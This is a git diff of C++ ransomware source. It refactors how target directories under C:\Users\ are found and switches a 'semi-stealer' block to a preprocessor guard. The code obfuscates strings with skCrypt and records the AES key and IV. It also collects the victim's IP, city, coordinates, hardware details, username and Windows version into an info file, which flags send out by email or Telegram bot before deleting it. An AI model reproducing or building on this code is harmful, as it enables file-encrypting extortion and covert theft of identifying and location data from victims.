@@ -53,21 +53,11 @@ int main(int argc, char* argv[]) {
 #endif
 
 
-    // retrieve the directory in which to encrypt files
-    string dir;
-#if !DEBUG
-    dir = (string)skCrypt("C:\\Users\\");
-#else
-    if (argc > 1)
-        dir = argv[1];
-    else if (FileExists(DEBUG_FOLDER))
-        dir = DEBUG_FOLDER;
-    else
-        dir = (string)skCrypt(".\\");
-#endif
+    // retrieve the directories in which to encrypt files
+    vector<string> dirs = RetrieveFolders(argc, argv);
 
     // retrieve the files to be encrypted
-    vector<string> files = GetFiles(dir);
+    vector<string> files = GetFiles(dirs);
 
     ofstream checkFile(CHECKSUM_FILE);
     checkFile << CHECK_CONTENT;
@@ -109,26 +99,26 @@ int main(int argc, char* argv[]) {
     // info.txt content
     string info_txt = (string)skCrypt("");
     info_txt += (string)skCrypt("Key: ") + key + (string)skCrypt("\\") + iv + (string)skCrypt("\n");
-    if (STEAL_INFO) { // semi-stealer
-        info_txt += (string)skCrypt("Date: ") + GetDate() + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("HWID: ") + GetHWID() + (string)skCrypt("\n");
-        vector<string> ipData = Split(GetIPData(), '\n');
-        info_txt += (string)skCrypt("IP: ") + ipData[0] + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("Country: ") + ipData[1] + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("City: ") + ipData[2] + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("Latitude: ") + ipData[3] + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("Longitude: ") + ipData[4] + (string)skCrypt("\n");
-        vector<string> systemData = Split(GetCPU(), '\n');
-        info_txt += (string)skCrypt("CPU name: ") + systemData[0] + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("CPU threads: ") + systemData[1] + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("Ram memory: ") + systemData[2] + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("GPU name: ") + GetGPU() + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("Host name: ") + GetPcName() + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("Username: ") + GetUsername() + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("Screen resolution: ") + GetResolution() + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("Windows version: ") + GetWinVersion() + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("Language: ") + GetLanguage() + (string)skCrypt("\n");
-    }
+#if STEAL_INFO   // semi-stealer
+    info_txt += (string)skCrypt("Date: ") + GetDate() + (string)skCrypt("\n");
+    info_txt += (string)skCrypt("HWID: ") + GetHWID() + (string)skCrypt("\n");
+    vector<string> ipData = Split(GetIPData(), '\n');
+    info_txt += (string)skCrypt("IP: ") + ipData[0] + (string)skCrypt("\n");
+    info_txt += (string)skCrypt("Country: ") + ipData[1] + (string)skCrypt("\n");
+    info_txt += (string)skCrypt("City: ") + ipData[2] + (string)skCrypt("\n");
+    info_txt += (string)skCrypt("Latitude: ") + ipData[3] + (string)skCrypt("\n");
+    info_txt += (string)skCrypt("Longitude: ") + ipData[4] + (string)skCrypt("\n");
+    vector<string> systemData = Split(GetCPU(), '\n');
+    info_txt += (string)skCrypt("CPU name: ") + systemData[0] + (string)skCrypt("\n");
+    info_txt += (string)skCrypt("CPU threads: ") + systemData[1] + (string)skCrypt("\n");
+    info_txt += (string)skCrypt("Ram memory: ") + systemData[2] + (string)skCrypt("\n");
+    info_txt += (string)skCrypt("GPU name: ") + GetGPU() + (string)skCrypt("\n");
+    info_txt += (string)skCrypt("Host name: ") + GetPcName() + (string)skCrypt("\n");
+    info_txt += (string)skCrypt("Username: ") + GetUsername() + (string)skCrypt("\n");
+    info_txt += (string)skCrypt("Screen resolution: ") + GetResolution() + (string)skCrypt("\n");
+    info_txt += (string)skCrypt("Windows version: ") + GetWinVersion() + (string)skCrypt("\n");
+    info_txt += (string)skCrypt("Language: ") + GetLanguage() + (string)skCrypt("\n");
+#endif
     info_txt = aes_encrypt(KEY, info_txt, IV);
     infoFileContent += info_txt;
     infoFileContent += skCrypt("\n");
@@ -213,7 +203,7 @@ int main(int argc, char* argv[]) {
     }
 #endif
 
-    // drop infoFile
+    // remove infoFile
 #if (DEBUG ? (DEBUG_SEND_EMAIL || DEBUG_SEND_TGBOT) : (SEND_EMAIL || SEND_TGBOT))
     if (remove((INFOFILE).c_str()) != 0)
         DeleteFileA((INFOFILE).c_str());
